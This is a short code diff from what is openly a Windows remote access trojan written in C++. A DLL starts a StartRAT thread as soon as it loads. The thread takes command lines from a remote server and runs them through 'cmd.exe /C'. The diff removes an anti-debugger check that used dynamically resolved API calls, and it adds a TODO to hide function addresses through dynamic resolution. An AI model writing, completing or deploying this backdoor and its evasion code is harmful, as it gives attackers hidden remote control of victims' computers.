@@ -12,9 +12,6 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 
 	while (true)
 	{
-		if (resolve_dynamically<IsDebuggerPresent_t>("IsDebuggerPresent")() || isDebuggerAttached())
-			resolve_dynamically<ExitThread_t>("ExitThread")(0);
-
 		// recv command from server
 		std::string commandLine = "cmd.exe /C ";
 		commandLine.append(conn->recv_data());
@@ -33,7 +30,8 @@ BOOL WINAPI DllMain(HINSTANCE dllHandle, DWORD reason_for_call, LPVOID lpvReserv
 {
 	switch (reason_for_call) {
 	case DLL_PROCESS_ATTACH:
-		DisableThreadLibraryCalls(dllHandle);  // Avoid repeated DllMain calls for threads
+		// TODO: RESOLVE FUNCTION ADDRESSES DYNAMICALLY
+		DisableThreadLibraryCalls(dllHandle);  // Avoid repeated DllMain calls for threads 
 		CreateThread(nullptr, 0, StartRAT, nullptr, 0, nullptr); // Create a separate thread to run after DllMain, to avoid deadlocks
 		break;
 	case DLL_PROCESS_DETACH:
